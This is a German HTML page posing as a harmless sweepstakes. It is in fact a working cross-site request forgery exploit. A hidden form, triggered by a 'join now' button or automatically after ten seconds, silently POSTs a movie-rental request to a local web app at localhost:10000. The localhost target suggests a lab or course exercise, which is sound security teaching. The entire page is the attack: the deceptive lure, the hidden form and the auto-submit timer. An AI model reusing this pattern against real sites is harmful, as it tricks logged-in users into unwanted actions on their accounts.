<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Harmloses Gewinnspiel</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    #attackForm { display: none; }
    #attackButton {
      padding: 10px 20px;
      background: #28a745; color: #fff;
      border: none; border-radius: 4px;
      cursor: pointer;
      font-size: 1rem;
    }
    #attackButton:hover { background: #218838; }
  </style>
</head>
<body>
  <h1>Willkommen zum großen Gewinnspiel!</h1>
  <p>Klick auf den Button, um herauszufinden, ob Du gewonnen hast:</p>
  <button id="attackButton">JETZT MITMACHEN</button>
  <p id="status" style="margin-top:1em; color:#555;"></p>

  <form id="attackForm"
        action="http://localhost:10000/addrent"
        method="POST"
        style="display:none;">
    <input type="hidden" name="movieUuid"    value="984008c7-afee-4067-955e-0b55a21de59f"/>
    <input type="hidden" name="startDate"    value="2025-07-09"/>
    <input type="hidden" name="numberOfDays" value="5"/>
  </form>
 <script>
    const btn    = document.getElementById('attackButton');
    const status = document.getElementById('status');

    function launchAttack() {
      status.textContent = 'Bitte kurz warten…';
      // Angriff nach 3 Sekunden
      setTimeout(() => {
        document.getElementById('attackForm').submit();
        status.textContent = 'Glückwunsch! Du hast gerade einen Film geliehen!';
      }, 3000);
    }

    // 1) Angriff per Button-Klick starten
    btn.addEventListener('click', launchAttack);

    // 2) Optional: nach 10 Sekunden auch ohne Klick ausführen
    setTimeout(() => {
      if (!status.textContent) {
        launchAttack();
      }
    }, 10000);
  </script>
</body>
</html>
